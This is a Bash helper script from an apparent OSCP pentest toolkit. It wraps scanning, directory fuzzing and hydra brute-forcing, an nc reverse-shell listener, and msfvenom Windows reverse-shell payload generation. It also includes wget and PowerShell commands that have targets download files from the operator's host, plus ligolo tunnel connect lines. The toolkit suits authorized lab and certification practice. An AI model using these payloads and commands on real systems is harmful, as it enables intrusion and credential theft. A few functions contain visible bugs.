#!/bin/bash


source $HOME/oscp-swiss/script/utils.sh
source $HOME/oscp-swiss/script/alias.sh
source $HOME/oscp-swiss/script/extension.sh

_load_settings
_load_private_scripts

# Description: List all functions, aliases, and variables
# Usage: swiss
# swiss -f <function name>
# swiss -c "category"
# swiss -h
# Category: [ ]
function swiss() {
    _banner() {
        swiss_logger info ".--------------------------------------------."
        swiss_logger info "|                                            |"
        swiss_logger info "|                                            |"
        swiss_logger info "|  __________       _______________________  |"
        swiss_logger info "|  __  ___/_ |     / /___  _/_  ___/_  ___/  |"
        swiss_logger info "|  _____ \\__ | /| / / __  / _____ \\_____ \\   |"
        swiss_logger info "|  ____/ /__ |/ |/ / __/ /  ____/ /____/ /   |"
        swiss_logger info "|  /____/ ____/|__/  /___/  /____/ /____/    |"
        swiss_logger info "|                                            |"
        swiss_logger info "|  by @dextermallo v1.4.2                    |"
        swiss_logger info "'--------------------------------------------'"
    }

    if [ $_swiss_app_banner = true ]; then
        _banner
    fi

    swiss_logger info "[i] Functions:"
    {
        grep -E '^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{' "$swiss_script" | sed -E 's/^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{/\1/';
        grep -E '^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{' "$swiss_extension" | sed -E 's/^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{/\1/';
    } | sort | column

    swiss_logger info "[i] Aliases:"
    {
        grep -E '^\s*alias\s+' "$swiss_extension" | sed -E 's/^\s*alias\s+([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/';
        grep -E '^\s*alias\s+' "$swiss_alias" | sed -E 's/^\s*alias\s+([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/';
    } | sort | column
    
    swiss_logger info "[i] Variables:"
    {
        grep -E '^\s*[a-zA-Z_][a-zA-Z0-9_]*=' "$swiss_extension" | sed -E 's/^\s*([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/';
        grep -E '^\s*[a-zA-Z_][a-zA-Z0-9_]*=' "$swiss_alias" | sed -E 's/^\s*([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/';
        grep -E '^\s*[a-zA-Z_][a-zA-Z0-9_]*=' "$swiss_script" | sed -E 's/^\s*([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/';
    } | sort | column

    # load /private scripts
    if [ -d "$swiss_private" ]; then
        for script in "$swiss_private"/*.sh; do
        if [ -f "$script" ]; then

            if grep -qE '^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{' "$script"; then
                swiss_logger info "[i] Function under $script:"
                grep -E '^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{' "$script"| sed -E 's/^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{/\1/' | sort | column
            fi
            
            if grep -qE '^\s*alias\s+' "$script"; then
                swiss_logger info "[i] Aliases under $script:"
                grep -E '^\s*alias\s+' "$script" | sed -E 's/^\s*alias\s+([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/' | sort | column
            fi
            
            if grep -qE '^\s*[a-zA-Z_][a-zA-Z0-9_]*=' "$script"; then
                swiss_logger info "[i] Variables under $script:"
                grep -E '^\s*[a-zA-Z_][a-zA-Z0-9_]*=' "$script" | sed -E 's/^\s*([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/' | sort | column
            fi
        fi
        done
    else
        swiss_logger error "[e] Directory $swiss_private not found."
    fi
}

# TODO: deprecate
function find_category() {
    if [[ "$1" == "-h" ]]; then

        local categories_list=()
        
        local category_exists() {
            local category="$1"
            for existing_category in "${categories_list[@]}"; do
                if [[ "$existing_category" == "$category" ]]; then
                    return 0
                fi
            done
            # category does not exist
            return 1  
        }        

        for script in "$swiss_root/script/"*.sh; do
            while IFS= read -r line; do
        
                if [[ $line == *"Category:"* ]]; then
                    # extract the categories between [ ] and split by comma
                    script_categories=$(echo "$line" | sed -n 's/.*Category: \[\(.*\)\].*/\1/p' | tr ',' '\n')

                    if [[ -n "$script_categories" ]]; then
                        while read -r category; do
                            # trim any leading/trailing whitespace
                            category=$(echo "$category" | xargs)
                            if [[ -n "$category" ]]; then
                                if ! category_exists "$category"; then
                                    categories_list+=("$category")
                                fi
                            fi
                        done <<< "$script_categories"
                    fi
                fi
            done < "$script"
        done

        swiss_logger info "[i] Supported Categories:"
        for category in $(printf "%s\n" "${categories_list[@]}" | sort); do
            swiss_logger "\t- $category\n"
        done
        return 0
    fi

    local evaluate_condition() {
        local condition="$1"
        local match=true

        # Nested parentheses
        while echo "$condition" | grep -q "("; do
            local inner_expr=$(echo "$condition" | sed -E 's/.*\(([^()]*)\).*/\1/')
            local inner_result=""

            if [[ "$inner_expr" == *"&"* ]]; then
                $inner_result=$(evaluate_condition "$inner_expr")
            elif [[ "$inner_expr" == *"|"* ]]; then
                $inner_result=$(evaluate_condition "$inner_expr")
            fi

            $condition="${condition//"(${inner_expr})"/"$inner_result"}"
        done

        # Handle and/or
        if [[ "$condition" == *"&"* ]]; then
            IFS='&' read -r term1 term2 <<< "$condition"
            for term in $term1 $term2; do
                if [[ "$term" == *"|"* ]]; then
                    if ! evaluate_condition "$term"; then
                        match=false
                        break
                    fi
                else
                    if [[ ! " $script_categories " =~ " $term " ]]; then
                        match=false
                        break
                    fi
                fi
            done
        elif [[ "$condition" == *"|"* ]]; then
            IFS='|' read -r term1 term2 <<< "$condition"
            match=false
            for term in $term1 $term2; do
                if [[ "$term" == *"&"* ]]; then
                    if evaluate_condition "$term"; then
                        match=true
                        break
                    fi
                else
                    if [[ " $script_categories " =~ " $term " ]]; then
                        match=true
                        break
                    fi
                fi
            done
        else
            match=false
            if [[ " $script_categories " =~ " $condition " ]]; then
                match=true
            fi
        fi
        $match && return 0 || return 1
    }

    for condition in "$@"; do
        for script in "$swiss_root/script/"*.sh; do
        while IFS= read -r line; do
            if [[ $line == *"Category:"* ]]; then
                script_categories=$(echo $line | sed -n 's/.*Category: \[\(.*\)\].*/\1/p' | tr ',' ' ')
                if evaluate_condition "$condition"; then
                    while IFS= read -r func_line; do
                        if [[ $func_line == "function "* ]]; then
                            func_name=$(echo $func_line | awk '{print $2}' | tr -d '(){')
                            swiss_logger info "[i] Function found: $func_name"
                            break
                        fi
                    done
                fi
            fi
        done < "$script"
        done
    done
}

# Description: 
#   Simplified version of the `ip a` command to show the IP address of the default network interface.
#   The default network interface's IP address is copied to the clipboard.
# Usage: i
# Category: [ ]
function i() {
    ip -o -f inet addr show | awk '{printf "%-6s: %s\n", $2, $4}'
    ip -o -f inet addr show | grep $_swiss_default_network_interface | awk '{split($4, a, "/"); printf "%s", a[1]}' | xclip -selection clipboard
}

# Description: Wrapped nmap command with default options
# Usage: nmap_default <IP> [mode]
# Modes: fast (default), tcp, udp, udp-all, stealth
# Example: nmap_default 192.168.1.1
# Category: [ recon ]
function nmap_default() {
    local ip=""
    local mode=${2:-"tcp"}
    
    _help() {
        swiss_logger info "Usage: nmap_default <IP> [<mode>]"
        swiss_logger info "Modes: fast (default), tcp, udp, udp-all, stealth"
    }

    if [[ "$1" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        ip="$1"
        shift
    else
        _help
        return 1
    fi

    local saved_file_path="$(pwd)/nmap/$ip"
    swiss_logger info "[i] Creating directory $saved_file_path ..."
    mkdir -p $saved_file_path

    case "$mode" in
        fast)
            mkdir -p $saved_file_path/fast
            swiss_logger info "[i] Start quick check. Saved to $saved_file_path/fast/tcp"
            nmap -v --top-ports 2000 $ip -oN $saved_file_path/fast/tcp

            local fast_ports=$(grep -oP '^\d+\/\w+' $saved_file_path/fast/tcp | awk -F/ '{print $1}' | tr '\n' ',' | sed 's/,$//')
            swiss_logger info "[i] Checking service on ports - $fast_ports. Saved to $saved_file_path/fast/tcp-svc"
            nmap -p$fast_ports -sVC $ip -oN $saved_file_path/fast/tcp-svc

            swiss_logger info "[i] Checking vuln script - $fast_ports. Saved to $saved_file_path/fast/tcp-vuln"
            nmap -p$fast_ports --script vuln $ip -oN $saved_file_path/fast/tcp-vuln

            swiss_logger info "[i] Check UDP top 200 ports. Saved to $saved_file_path/fast/udp-top-200"
            sudo nmap --top-ports 200 -sU -F -v $ip -oN $saved_file_path/fast/udp-top-200

            swiss_logger warn "[w] Remember to run tcp and udp mode for full enumeration"
            ;;
        tcp)
            mkdir -p $saved_file_path/tcp
            swiss_logger info "[i] Start tcp check. Saved to $saved_file_path/tcp/check-1"
            nmap -p0-65535 -v $ip -oN $saved_file_path/tcp/check-1

            local ports=$(grep -oP '^\d+\/\w+' $saved_file_path/tcp/check-1 | awk -F/ '{print $1}' | tr '\n' ',' | sed 's/,$//')
            swiss_logger info "[i] Checking service on ports - $ports. Saved to $saved_file_path/tcp/svc"
            nmap -p$ports -sVC $ip -oN $saved_file_path/tcp/svc

            swiss_logger info "[i] Checking vuln script - $ports. Saved to $saved_file_path/tcp/vuln"
            nmap -p$ports --script vuln $ip -oN $saved_file_path/tcp/vuln

            swiss_logger warn "[w] Services found in the second round but not in the first round:"
            comm -13 <(echo "$services_first") <(echo "$services_second")
            ;;
        udp)
            mkdir -p $saved_file_path/udp
            swiss_logger info "[i] Start udp check (top 200 ports). Saved to $saved_file_path/udp/udp_fast"
            sudo nmap --top-ports 200 -sU -F -v $ip -oN $saved_file_path/udp/fast
            ;;
        udp-all)
            mkdir -p $saved_file_path/udp
            swiss_logger info "[i] Start udp check (all). Saved to $saved_file_path/udp/udp_all"
            sudo nmap -sU -F -v $ip -oN $saved_file_path/udp/udp_all
            ;;
        stealth)
            mkdir -p $saved_file_path/stealth
            swiss_logger info "[i] Start stealth nmap. Saved to $saved_file_path/stealth/stealth"
            sudo nmap -sS -p0-65535 $ip -oN $saved_file_path/stealth/stealth
            ;;
        *)
            swiss_logger error "[e] Invalid mode '$mode'. Valid modes are: fast, tcp, udp, udp-all."
            return 1
            ;;
    esac
}

# Description: one-liner to start services, including docker, ftp, http, smb, ssh, bloodhound, ligolo (extension), wsgi
# Usage: svc <service name>
# Arguments:
#   service name: docker; ftp; http; smb; ssh; bloodhound; ligolo (extension); wsgi
# Example:
#   svc http # to spawn a http server in the current directory
#   svc ftp  # to spawn a ftp server in the current directory
# Category: [ recon, pe ]
function svc() {
    local service=""

    _help() {
        swiss_logger info "Usage: svc <service name>]"
        swiss_logger info "service: docker; ftp; http; smb; ssh; bloodhound; ligolo; wsgi"
    }

    service="$1"

    if [[ -z "$service" ]]; then
        _help
        return 1
    fi

    case "$service" in
        docker)
            swiss_logger info "[i] start docker"
            swiss_logger warn "[w] to stop, use the following commands: "
            swiss_logger warn "[w] sudo systemctl stop docker"
            swiss_logger warn "[w] sudo systemctl stop docker.socket"
            sudo service docker restart
            ;;
        ftp)
            swiss_logger info "[i] start ftp server on host"
            swiss_logger info "usage:"
            swiss_logger info "\t(1) run ftp"
            swiss_logger info "\t(2) run open <ip> 21"
            swiss_logger info "\t(2-2) Default Interface ($_swiss_default_network_interface) IP: $(_get_default_network_interface_ip)"
            swiss_logger info "\t(3) use username anonymous"
            swiss_logger info "\t(4) binary # use binary mode"
            swiss_logger info "\t(5) put <file-you-want-to-download>"
            python3 -m pyftpdlib -w -p 21
            ;;
        http)
            swiss_logger info "[i] start http server"
            swiss_logger warn "[w] python3 -m http.server 80"
            i
            python3 -m http.server 80
            ;;
        smb)
            swiss_logger info "[i] start smb server"
            swiss_logger info "[i] impacket-smbserver smb . -smb2support"
            i
            impacket-smbserver smb . -smb2support
            ;;
        ssh)
            swiss_logger info "[i] start ssh server"
            swiss_logger warn "[w] sudo systemctl stop ssh; kill -9 $(pgrep ssh); sudo systemctl start ssh"
            i
            # kill all ssh process
            sudo systemctl stop ssh
            kill -9 $(pgrep ssh)
            sudo systemctl start ssh
            ;;
        bloodhound)
            swiss_logger info "[i] start BloodHound (v2.4.3) ..."
            # TODO: add more instructions & reproduce from skretch
            sudo neo4j console
            ;;
        bloodhound-ce)
            _extension_fn_banner
            # ref: https://support.bloodhoundenterprise.io/hc/en-us/articles/17468450058267-Install-BloodHound-Community-Edition-with-Docker-Compose
            swiss_logger info "[i] start BloodHound CE (v2.4.1) ..."
            swiss_logger info "[i] start port check on 8080"

            # Check if port 8080 is open using lsof
            if lsof -i :8080 > /dev/null; then
                swiss_logger error "[e] Port 8080 is open. Exited"
                exit 1
            fi

            swiss_logger info "[i] cloning docker-compose files from /opt/BloodHound/examples/docker-compose"
            cp /opt/BloodHound/examples/docker-compose/* $(pwd)

            swiss_logger info "[i] BloodHound CE starts on port 8080 (default), username: admin, password check on the terminal logs"
            swiss_logger info "[i] preferred password: @Bloodhound123"

            sudo docker-compose up
            ;;
        ligolo)
            _extension_fn_banner
            swiss_logger info "[i] start ligolo agent"
            swiss_logger warn "[w] one-time setup: sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up"
            swiss_logger info "[i] under target (find agent executable under \$ligolo_path):"
            swiss_logger info "[i] agent.exe -connect $(_get_default_network_interface_ip):443 -ignore-cert"
            swiss_logger warn "[w] Using fingerprint: "
            swiss_logger warn "[w] agent.exe -connect $(_get_default_network_interface_ip):443 -accept-fingerprint [selfcert-value]"

            swiss_logger info "[i] after connection: "
            swiss_logger info "[i] > session                                    # choose the session"
            swiss_logger info "[i] > ifconfig                                   # check interface"
            swiss_logger info "[i] sudo ip route add 192.168.0.0/24 dev ligolo  # add interface"
            swiss_logger warn "[w] ip route del 122.252.228.38/32               # removal after use"
            swiss_logger info "[i] start                                        # start the agent"
            # TODO: add to configuration
            local ligolo_agent_path="$swiss_utils/tunnel/ligolo-0.6.2/proxy"
            $ligolo_agent_path -selfcert -laddr 0.0.0.0:443
            ;;
        wsgi)
            _extension_fn_banner
            swiss_logger info "[i] start wsgidav under the directory: $(pwd)"
            swiss_logger info "[i] port used: 80"
            i
            $_swiss_svc_wsgi --host=0.0.0.0 --port=$_swiss_svc_wsgi_default_port --auth=anonymous --root .
            ;;
        python-venv)
            _extension_fn_banner
            python3 -m venv .venv
            source .venv/bin/activate
            ;;
        *)
            swiss_logger error "[e] Invalid service '$service'. Valid service: docker; ftp; http; smb; ssh; bloodhound; wsgi; python-venv"
            return 1
            ;;
    esac
}

# Description: one-liner to ship files to the target machine. With no copy-paste needs.
# Usage: ship [-t|--type linux|windows] [-a|--auto-host-http] <filepath>
# Arguments:
#   -t|--type: linux|windows (default: linux)
#   -a|--auto-host-http: auto-host the http server (default: true)
# Example:
#   ship ./rce.sh
#   ship -t windows ./rce.exe
# Category: [ rce, pe, file-transfer ]
function ship() {
    local type="linux"
    local autoHostHttp=true
    local filepaths=()
    local all_cmds=""

    _helper() {
        swiss_logger info "Usage: ship [-t|--type linux|windows] [-a|--auto-host-http] <filepath>..."
        return 1
    }

    while [[ $# -gt 0 ]]; do
        case $1 in
            -t|--type)
                type="$2"
                shift 2
                ;;
            -a|--auto-host-http)
                autoHostHttp="$2"
                shift 2
                ;;
            -h|--help)
                _helper
                return 0
                ;;
            *)
                filepaths+=("$1")
                shift
                ;;
        esac
    done

    if [[ ${#filepaths[@]} -eq 0 ]]; then
        swiss_logger error "[e] At least one filepath is required."
        _helper
        return 1
    fi

    local all_cmds=""

    for filepath in "${filepaths[@]}"; do
        if [[ ! -f "$filepath" ]]; then
            swiss_logger error "[e] File '$filepath' does not exist."
            return 1
        fi

        local filename=$(basename "$filepath")
        cp "$filepath" "./$filename" && swiss_logger info "[i] File '$filename' copied to current directory."

        local cmd
        if [[ "$type" == "linux" ]]; then
            cmd="wget $(_get_default_network_interface_ip)/$filename"
        elif [[ "$type" == "windows" ]]; then
            cmd="powershell -c \"Invoke-WebRequest -Uri 'http://$(_get_default_network_interface_ip)/$filename' -OutFile C:/ProgramData/$filename\""
        else
            log error "[e] Unknown type '$type'."
            return 1
        fi

        all_cmds+="$cmd"$'\n'
    done

    _autoHost() {
        if [[ "$autoHostHttp" = true ]]; then
            svc http
        else
            swiss_logger warn "[w] Remember to host the web server on your own"
        fi
    }

    echo -n "$all_cmds" | xclip -selection clipboard
    swiss_logger info "[i] All commands copied to clipboard."
    _autoHost

    # TODO: remove the copied files automatically with global conf
}

# Description:
#   One-liner to start a reverse shell listener,
#   warpped with rlwrap to make the reverse shell interactive
# Usage: listen <port>
# Category: [ rce ]
function listen() {
    i
    rlwrap nc -lvnp $1
}

# Description: Generate a reverse shell using msfvenom
# Usage: windows_rev <-p PORT> <-a x86|x64|dll> [-i IP]
# Arguments:
#   -p|--port: Port number for the reverse shell
#   -a|--arch: Architecture for the reverse shell (x86, x64, dll)
#   -i|--ip: IP address for the reverse shell
# Example:
#  windows_rev -p 4444 -a x86 -i
# Category: [ rce, windows]
# References:
#   - https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
#   - https://github.com/rodolfomarianocy/OSCP-Tricks-2023/blob/main/shell_and_some_payloads.md
# TODO: extends to Linux
function windows_rev() {
    _helper() {
        swiss_logger info "[i] generating windows rev exe using msfvenom"
        swiss_logger info "Usage: gen_win_rev_exe <-a, --arch x86|x64|dll> [<-i, --ip IP] [-p, --port PORT]"
    }

    local ip=$(_get_default_network_interface_ip)
    local port="$_swiss_windows_rev_default_port"
    local arch
    local generate_stage=$_swiss_windows_rev_generate_stage
    local generate_stageless=$_swiss_windows_rev_generate_stageless

    while [[ $# -gt 0 ]]; do
        case $1 in
            -i|--ip)
                ip="$2"
                shift 2
                ;;
            -p|--port)
                port="$2"
                shift 2
                ;;
            -a|--arch)
                arch="$2"
                shift 2
                ;;
            *)
                swiss_logger error "[e] Invalid option: $1"
                _helper
                return 1
                ;;
        esac
    done
    echo $port
    echo $arch
    if [[ -z "$port" || -z "$arch" ]]; then
        swiss_logger error "[e] Port and architecture must be specified"
        swiss_logger
        return 1
    fi

    case $arch in
        x86)

            if [[ $generate_stage = true ]]; then
                msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x86-stage.exe
            fi

            if [[ $generate_stageless = true ]]; then
                msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x86-stageless.exe
            fi
            ;;
        x64)
            if [[ $generate_stage = true ]]; then
                msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x64-stage.exe
            fi

            if [[ $generate_stageless = true ]]; then
                msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x64-stageless.exe
            fi
            ;;
        dll)
            msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=$port -f dll -o reverse.dll
            ;;
        *)
            swiss_logger error "[e] Invalid architecture: $arch. Only x86, x64, and dll are supported."
            return 1
            ;;
    esac
}

# Description: directory fuzzing using fuff, compatible with original arguments
# Usage: ffuf_default [URL/FUZZ] (options)
# Example: ffuf_default http://example.com/FUZZ -fc 400
# Category: [ recon, http ]
function ffuf_default() {

    _helper() {
        swiss_logger info "Usage: ffuf_default [URL/FUZZ] (options)"
        swiss_logger warn "[w] Recursive with depth = $_swiss_ffuf_default_recursive_depth"
        swiss_logger warn "[w] Default wordlist: $_swiss_ffuf_default_wordlist"
    }

    if [ $# -eq 0 ]; then
        _helper
    else
        local url="$1"
        if [[ "$url" =~ ^https?:// ]]; then
            # If the URL includes a protocol, extract the part after '://'
            local domain=$(echo "$url" | awk -F/ '{print $3}')
        else
            # If the URL does not include a protocol, treat the first part as the domain/IP
            local domain=$(echo "$url" | awk -F/ '{print $1}')
        fi
        local domain_dir="$(pwd)/ffuf/$domain"
        swiss_logger info "[i] Creating directory $domain_dir ..."
        mkdir -p "$domain_dir"

        if [[ -f "$_swiss_ffuf_default_wordlist.statistic" ]]; then
            swiss_logger warn "====== Wordlist Statistic ======"
            \cat $_swiss_ffuf_default_wordlist.statistic
            swiss_logger warn "================================"
        fi

        local stripped_url="${url/FUZZ/}"

        if [ $_swiss_ffuf_default_use_dirsearch = true ]; then
            if _check_cmd_exist dirsearch; then
                swiss_logger info "[i] (Extension) dirsearch quick scan"
                dirsearch -u $stripped_url
            else
                swiss_logger error "[e] dirsearch is not installed"
            fi
        fi

        ffuf -w $_swiss_ffuf_default_wordlist -recursion -recursion-depth $_swiss_ffuf_default_recursive_depth -u ${@} | tee "$domain_dir/ffuf-default"
    fi
}

# Description: file traversal fuzzing using ffuf, compatible with original arguments
# Usage: ffuf_traversal [URL] (options)
# Example: ffuf_traversal http://example.com -fc 400
# Category: [ recon, http ]
function ffuf_traversal_default() {
    _helper() {
        swiss_logger info "Usage: ffuf_traversal_default [URL] (options)"
        swiss_logger warn "[w] You may need to try <URL>/FUZZ and <URL>FUZZ"
    }

    if [ $# -eq 0 ]; then
        _helper
    else
        local url="$1"
        if [[ "$url" =~ ^https?:// ]]; then
            local domain=$(echo "$url" | awk -F/ '{print $3}')
        else
            local domain=$(echo "$url" | awk -F/ '{print $1}')
        fi
        local domain_dir="$(pwd)/ffuf/$domain"
        swiss_logger info "[i] Creating directory $domain_dir ..."
        mkdir -p "$domain_dir"

        if [[ -f "$_swiss_ffuf_traversal_default_wordlist.statistic" ]]; then
            swiss_logger warn "====== Wordlist Statistic ======"
            \cat $_swiss_ffuf_traversal_default_wordlist.statistic
            swiss_logger warn "================================"
        fi

        ffuf -w $_swiss_ffuf_traversal_default_wordlist -u ${@} | tee "$domain_dir/traversal-default"
    fi
}

# Description: subdomain fuzzing using gobuster, compatible with original arguments
# Usage: gobuster_subdomain_default [domain_name] (options)
# Example: gobuster_subdomain_default example.com
# Category: [ recon, http ]
function gobuster_subdomain_default() {
    _helper() {
        swiss_logger info "Usage: gobuster_subdomain_default [domain_name] (options)"
    }

    if [ $# -eq 0 ]; then
        _helper
    else
        local url="$1"
        if [[ "$url" =~ ^https?:// ]]; then
            local domain=$(echo "$url" | awk -F/ '{print $3}')
        else
            local domain=$(echo "$url" | awk -F/ '{print $1}')
        fi
        local domain_dir="$(pwd)/ffuf/$domain"
        swiss_logger info "[i] Creating directory $domain_dir ..."
        mkdir -p "$domain_dir"

        if [[ -f "$_swiss_gobuster_subdomain_default_wordlist.statistic" ]]; then
            swiss_logger warn "====== Wordlist Statistic ======"
            \cat $_swiss_gobuster_subdomain_default_wordlist.statistic
            swiss_logger warn "================================"
        fi

        gobuster dns -w $_swiss_gobuster_subdomain_default_wordlist -t 20 -o $domain_dir/subdomain-default -d ${@}
    fi
}

# Description: vhost fuzzing using gobuster, compatible with original arguments
# Usage: gobuster_vhost_default [ip] [domain] (options)
# Arguments:
#   - ip: IP address
#   - domain: Domain name (e.g., example.com)
# Example: gobuster_vhost_default
# Category: [ recon, http ]
function gobuster_vhost_default() {
    _helper() {
        swiss_logger info "Usage: gobuster_vhost_default [ip] [domain] (options)"
    }

    if [ $# -eq 0 ]; then
        _helper
    else

        local ip="$1"
        local domain="$2"
        local domain_dir="$(pwd)/ffuf/$domain"
        swiss_logger info "[i] Creating directory $domain_dir ..."
        mkdir -p "$domain_dir"

        if [[ -f "$_swiss_gobuster_vhost_default_wordlist.statistic" ]]; then
            swiss_logger warn "====== Wordlist Statistic ======"
            \cat $_swiss_gobuster_vhost_default_wordlist.statistic
            swiss_logger warn "================================"
        fi

        gobuster vhost -k -u $ip --domain $domain --append-domain -r \
                 -w $_swiss_gobuster_vhost_default_wordlist \
                 -o $domain_dir/vhost-default -t 64
    fi
}

# Description: hydra default
# Usage: hydra_default <IP> <PORTS>
# Example: hydra_default
# Category: [ recon, brute-force, ftp, ssh ]
function hydra_default() {
    local IP=$1
    local PORTS=$2

    if [ ! -f "username.txt" ]; then
        swiss_logger error "[e] username.txt not found in the current directory."
        return 1
    fi

    for PORT in $(echo $PORTS | tr "," "\n"); do
        case $PORT in
            21)
                swiss_logger info "[i] Running hydra for FTP on port $PORT..."
                hydra -L username.txt -e nsr -s $PORT ftp://$IP
                ;;
            22)
                swiss_logger info "[i] Running hydra for SSH on port $PORT..."
                hydra -L username.txt -e nsr -s $PORT ssh://$IP
                ;;
            23)
                swiss_logger info "[i] Running hydra for Telnet on port $PORT..."
                hydra -L username.txt -e nsr -s $PORT telnet://$IP
                ;;
            *)
                swiss_logger error "[e] Port $PORT not recognized or not supported for brute-forcing by this script."
                ;;
        esac
    done
}

# Description: get all urls from a web page
# Usage: get_web_pagelink <url>
# Category: [ recon, http ]
function get_web_pagelink() {
    swiss_logger info "[i] start extracting all urls from $1"
    swiss_logger info "[i] original files will be stored at $PWD/links.txt"
    swiss_logger info "[i] unique links (remove duplicated) will be stored at $PWD/links-uniq.txt"
    lynx -dump $1 | awk '/http/{print $2}' > links.txt
    sort -u links.txt > links-uniq.txt
    cat ./links-uniq.txt
}

# Description: get keywords from a web page
# Usage: get_web_keywords <url>
# Category: [ recon, http ]
function get_web_keywords() {
    swiss_logger info "Usage: get_web_keywords <url>"
    cewl -d $_swiss_get_web_keywords_depth -m $_swiss_get_web_keywords_min_word_length -w cewl-wordlist.txt $1
}

# Description:
#   Copy a linpeas-like script to the clickboard. You can paste it to the target machine (Linux) directly without any file transfer effort.
#   This is helpful to help you to enumerate the target machine.
#   Once you paste the script to the target machine, you can run the command `check` to enumerate:
# Usage (On the target machine): 
#   Usage: check <option>
# Arguments (option):
#   - 1|user|u: check user information
#   - 2|su: check sudo permission
#   - 3|suid: check suid permission
#   - 4|cred-file: check common credential files (i.e., /etc/passwd, /etc/group)
#   - 5|exec|executable: listing executable files
#   - 6|dir|directory: listing interesting directories (e.g., /tmp, /opt)
#   - 7|os: check OS information
#   - 8|ps|proc|process: check running processes
#   - 9|cron|crontab: check cron jobs
#   - 10|net|network: check network information
#   - 11|dir-filename: find interesting filename recursively under the current directory
#   - 12|dir-file: find the interesting file content recursively under the current directory
#   - 13|search-filename <keyword>: search filename with keyword under the current directory
#   - 14|search-file <keyword>: search file content with keyword under the current directory
#   - 15|env: check environment variables
# Example:
#   $ check user             # list user information
#   $ check 3                # list suid permission
#   $ check 14 funny-content # search file content with 'funny-content' under the current directory
# Category: [ pe, recon, linux ]
function cp_target_script() {
    swiss_logger info "Usage: cp_target_script"
    local shell_path="$swiss_root/script/target-enum-script.sh"
    local new_file_path="$mktemp.sh"
    \cat $shell_path > $new_file_path
    echo "" >> $new_file_path
    echo "host='$(_get_default_network_interface_ip)'" >> $new_file_path
    echo "clear" >> $new_file_path
    \cat $new_file_path | xclip -selection clipboard
    rm $new_file_path
}

# Description: tcpdump traffic from an IP address
# Usage: listen_target <ip> [-i <interface> | --interface <interface>]
# Arguments:
#  <ip>: IP address to listen to
#  -i, --interface: Network interface to listen on (default: tun0)
# Example:
#   listen_target 192.168.1.2 # listen on traffic from/to 192.168.1.2 on the default network interface
# Category: [ recon, pe ]
function listen_target() {
    swiss_logger info "[i] tcpdump to listen on traffic from/to an IP address"
    swiss_logger info "Usage: listen_target <ip> [-i <interface> | --interface <interface>]"

    local interface="${DEFAULT_NETWORK_INTERFACE:-tun0}"
    local ip=""

    while [[ $# -gt 0 ]]; do
        case "$1" in
            -i|--interface)
                interface="$2"
                shift 2
                ;;
            *)
                ip="$1"
                shift
                ;;
        esac
    done

    if [[ -z "$ip" ]]; then
        swiss_logger error "[e] IP address is required"
        return 1
    fi

    sudo tcpdump -i "$interface" dst "$ip" or src "$ip"
}

# Description:
#   Spawn the new session in the workspace, and set target into the variables.
#   The  function is configured by the environment variable _swiss_spawn_session_in_workspace_start_at_new_session
#   See settings.json for more details.
# Usage: spawn_session_in_workspace
# Category: [ ]
function spawn_session_in_workspace() {
    if [ "$_swiss_spawn_session_in_workspace_start_at_new_session" = true ]; then
        go_workspace
        get_target
    fi
}

# Description: merge files into one file. Especially used for merging wordlists.
# Usage: merge <file1> <file2> ... [-o <output>] [-s <statistic>]
# Arguments:
#  -o|--output: Output file name (default: merged.txt)
#  -s|--statistic: greate a statistic of your merges (default: true)
# Example:
#   # To combine wordlists for subdomain enumeration:
#   merge /usr/share/wordlists/amass/subdomains-top1mil-110000.txt \
#         /usr/share/wordlists/seclists/Discovery/DNS/fierce-hostlist.txt \
#         /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
#         -o subdomain+vhost-default.txt
# Category: [ prep, brute-force ]
function merge() {
    local output="merged.txt"
    local statistic=true
    local files=()
    local total_lines=0

    while [[ "$#" -gt 0 ]]; do
        case "$1" in
            -o|--output)
                output="$2"
                shift 2
                ;;
            -s|--statistic)
                statistic="$2"
                shift 2
                ;;
            *)
                files+=("$1")
                shift
                ;;
        esac
    done

    if [[ "${#files[@]}" -lt 2 ]]; then
        swiss_logger error "[e] At least two files to merge."
        return 1
    fi

    for file in "${files[@]}"; do
        if [[ ! -f "$file" ]]; then
            swiss_logger error "[e] File not found: $file"
            return 1
        fi
    done

    local temp_output=$(mktemp)

    for file in "${files[@]}"; do
        total_lines=$((total_lines + $(wc -l < "$file")))
        sort -u "$file" >> "$temp_output"
    done

    sort -u "$temp_output" -o "$output"
    rm "$temp_output"

    local unique_lines
    unique_lines=$(wc -l < "$output")
    local duplicates_removed=$((total_lines - unique_lines))

    if [[ "$statistic" == true ]]; then
        local stat_file="$output.statistic"
        {
            echo "Original filenames:"
            for file in "${files[@]}"; do
                echo "  - $file"
            done
            echo "Line counts per file:"
            for file in "${files[@]}"; do
                echo "  - $file: $(wc -l < "$file") lines"
            done
            echo "Total line count before merge: $total_lines"
            echo "Total line count after merge: $unique_lines"
            echo "Lines saved after merge (duplicates removed): $duplicates_removed"
        } > "$stat_file"
    fi

    swiss_logger info "[i] Files merged into $output"
